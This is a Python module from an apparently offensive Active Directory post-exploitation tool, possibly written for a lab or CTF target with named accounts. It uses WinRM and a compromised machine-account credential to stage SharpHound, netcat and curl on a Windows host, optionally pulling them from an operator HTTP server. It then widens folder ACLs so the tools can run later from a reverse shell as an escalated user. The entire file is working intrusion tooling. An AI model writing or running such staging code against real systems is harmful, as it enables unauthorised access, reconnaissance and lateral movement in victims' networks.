"""Pre-stage SharpHound + helpers during postex deploy; execute later as escalated user.

Two-phase model:
  1. **Upload** — WinRM / evil-winrm as the machine/hash principal (e.g. msa_health$).
  2. **Execute** — reverse-shell token of the scheduled-task user (e.g. jaylee.clifton).
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import TYPE_CHECKING, Any

from admapper.support.output import print_info, print_success, print_warning

if TYPE_CHECKING:
    from admapper.winrm.client import WinRMClient

# WinRM (machine account) stages here; jaylee gets RX via icacls after upload.
# C:\Windows\Temp\ADMapper is often jaylee-owned from prior shell sessions — msa_health$ cannot mkdir there.
REMOTE_TOOLKIT_BASE = r"C:\ProgramData\ADMapper\sh"
REMOTE_TOOLKIT_OUT = rf"{REMOTE_TOOLKIT_BASE}\out"
_OPTIONAL_TOOL_NAMES = ("curl.exe", "nc.exe", "nc64.exe")


def _bundle_root() -> Path:
    return Path(__file__).resolve().parent


def resolve_tool(name: str) -> Path | None:
    """Find a bundled helper binary (tools/, sharphound/, admapper/, or repo root)."""
    root = _bundle_root()
    repo_root = root.parents[1]
    for candidate in (
        root / "tools" / name,
        root / name,
        root.parent / name,
        repo_root / name,
    ):
        if candidate.is_file():
            return candidate
    return None


def bundled_optional_tools() -> list[tuple[str, Path]]:
    """Return (remote_name, local_path) for each optional tool present on disk."""
    found: list[tuple[str, Path]] = []
    for name in _OPTIONAL_TOOL_NAMES:
        path = resolve_tool(name)
        if path is not None:
            found.append((name, path))
    return found


def sharphound_bundle_exe() -> Path:
    exe = _bundle_root() / "SharpHound.exe"
    if not exe.is_file():
        raise FileNotFoundError(f"SharpHound.exe not found at {exe}")
    return exe


def load_deploy_toolkit_meta(ws_path: Path) -> dict[str, Any] | None:
    """Read toolkit staging metadata written during postex deploy."""
    path = ws_path / "postex_deploy.json"
    if not path.is_file():
        return None
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    files = data.get("toolkit_files")
    if not files:
        return None
    return {
        "base": str(data.get("toolkit_base") or REMOTE_TOOLKIT_BASE),
        "upload_user": str(data.get("toolkit_upload_user") or data.get("shell_user") or ""),
        "execute_as": str(data.get("toolkit_execute_as") or data.get("run_as_user") or ""),
        "files": list(files),
    }


def _grant_toolkit_acl(
    client: WinRMClient,
    *,
    domain: str,
    execute_as: str,
) -> None:
    """Grant read/execute on the toolkit dir to the user who will run the shell task."""
    principals: list[str] = []
    user = execute_as.strip().rstrip("$")
    skip = frozenset({"unknown", "system", "localservice", "networkservice"})
    if user and user.lower() not in skip:
        principals.append(user if "\\" in user else f"{domain}\\{user}")
    principals.append("Users")
    base = REMOTE_TOOLKIT_BASE.replace('"', '\\"')
    for principal in principals:
        try:
            client.execute(
                f'icacls "{base}" /grant "{principal}:(OI)(CI)RX"',
                shell="cmd",
                timeout=60,
            )
        except Exception:
            continue
    print_info(
        f"toolkit: ACL RX on {REMOTE_TOOLKIT_BASE} for shell user(s) {', '.join(principals)}"
    )


def stage_toolkit_winrm(
    client: WinRMClient,
    *,
    domain: str,
    upload_user: str,
    execute_as: str,
    http_fetch_host: str | None,
    http_port: int = 8765,
) -> list[str]:
    """Upload toolkit via WinRM (upload_user); execution is deferred to execute_as."""
    from admapper.winrm.upload import remote_file_ok, upload_file

    upload_label = upload_user if "\\" in upload_user else f"{domain}\\{upload_user}"
    exec_label = execute_as if "\\" in execute_as else f"{domain}\\{execute_as}"
    print_info(
        f"toolkit: staging via WinRM as {upload_label} "
        f"(SharpHound/curl/nc run later as {exec_label})"
    )

    base_fwd = REMOTE_TOOLKIT_BASE.replace("\\", "/")
    client.execute(
        f'if not exist "{REMOTE_TOOLKIT_BASE}" mkdir "{REMOTE_TOOLKIT_BASE}"',
        shell="cmd",
        timeout=30,
    )
    client.execute(
        f'if not exist "{REMOTE_TOOLKIT_OUT}" mkdir "{REMOTE_TOOLKIT_OUT}"',
        shell="cmd",
        timeout=30,
    )

    staged: list[str] = []
    uploads: list[tuple[str, Path]] = [
        ("SharpHound.exe", sharphound_bundle_exe()),
        *bundled_optional_tools(),
    ]
    for remote_name, local_path in uploads:
        remote = f"{base_fwd}/{remote_name}"
        expected = local_path.stat().st_size
        if remote_file_ok(client, remote, expected_size=expected):
            print_info(f"toolkit: {remote_name} already on target ({expected} bytes)")
            staged.append(remote_name)
            continue
        print_info(
            f"toolkit: uploading {remote_name} → {REMOTE_TOOLKIT_BASE}\\{remote_name}"
        )
        upload_file(
            client,
            local_path,
            remote,
            http_fetch_host=http_fetch_host,
            http_port=http_port,
        )
        if not remote_file_ok(client, remote, expected_size=expected):
            print_warning(f"toolkit: {remote_name} size verify failed after upload")
            continue
        staged.append(remote_name)

    curl_remote = f"{REMOTE_TOOLKIT_BASE}\\curl.exe"
    if "curl.exe" not in staged:
        copy_out = client.execute(
            f'if not exist "{curl_remote}" copy /Y "%SystemRoot%\\System32\\curl.exe" "{curl_remote}"',
            shell="cmd",
            timeout=60,
        )
        body = (copy_out.stdout or "").strip()
        if remote_file_ok(client, f"{base_fwd}/curl.exe", expected_size=1):
            staged.append("curl.exe")
            print_success(f"toolkit: curl.exe seeded from System32 (fallback)")
        elif body:
            print_warning(f"toolkit: could not seed curl.exe — {body[:200]}")

    _grant_toolkit_acl(client, domain=domain, execute_as=execute_as)
    if staged:
        print_success(
            f"toolkit uploaded @ {REMOTE_TOOLKIT_BASE} — "
            f"awaiting {exec_label} shell to execute"
        )
    else:
        print_warning("toolkit: nothing staged")
    return staged
